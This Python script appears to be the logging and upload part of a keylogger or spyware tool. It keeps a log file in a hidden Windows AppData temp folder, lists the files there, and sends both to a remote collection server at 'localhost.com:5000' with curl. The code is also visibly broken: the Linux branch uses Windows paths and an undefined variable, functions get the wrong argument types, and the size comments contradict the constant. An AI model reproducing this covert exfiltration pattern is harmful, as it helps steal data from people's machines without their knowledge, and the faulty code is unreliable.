import getpass
import platform
import os
from pathlib import Path
import subprocess

path = str()
MAXSIZE = 5096

def open_path():
    os = platform.system()
    username = getpass.getuser()

    if(os == 'Windows'):
        try:
            with open(f"C:\\Users\\{username}\\AppData\\LocalLow\\Temp\\log.txt","a+") as file:
                 #if file larger than 1MB then clear it
                 if (check_file(file) >=MAXSIZE):
                    # clear file and start from scratch if file is larger than 1MB
                    file.seek(0)
                    file.truncate(0)
                 else:
                    pass
                
                #check_file(file)
                #print(f"[+]{os} : {file.name})[+]")         
        except FileNotFoundError:
                print("Error: File Not Found!")
        except PermissionError:
            print("Error: You do not have permission to access this file.")
        except OSError as e:
            print(f"An OS error occurred: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")     

        #set path to variable (Windows)
        path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\log.txt").format(username)
        

    elif(os == 'Linux'):
        try:
            with open(f"C:\\Temp\\log.txt","a+") as f:
                print(f"[+]{os} : {file.name})[+]") 
        except FileNotFoundError:
                print("Error: File Not Found!")
        except PermissionError:
            print("Error: You do not have permission to access this file.")
        except OSError as e:
            print(f"An OS error occurred: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")  

        #set path to variable (Linux)
        path = "C:\\Temp\\log.txt"
        check_file(path)

    return path


def check_file(file):
# CHECK SIZE... 
    original_pos = file.tell()      # Save current position
    file.seek(0, os.SEEK_END)       # Move to the end of the file
    size = file.tell()               # The current position is the size in bytes
    file.seek(original_pos) 
    print(f"File size: {size} bytes")  
    return size                     # Return to original position
    
def get_files():
    #list files in current director
    username = getpass.getuser()
    tmp_file_path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\tmp.txt").format(username)

    path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\").format(username)
    files = [f for f in Path(path).iterdir() if f.is_file()]

    with open(tmp_file_path, "w") as path:
        for f in files:
            path.write(f)
            print (f)
        
        path.close()

    #send file
    subprocess.run(["curl", "-F", "file=@tmp.txt", "https://localhost.com:5000"])
    print("File sent...")

def send_log():
    username = getpass.getuser()
    log_path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\log.txt").format(username)
    result = subprocess.run(["curl", "-F", f"file={path}", "https://localhost.com:5000"])
    print(result.stdout)



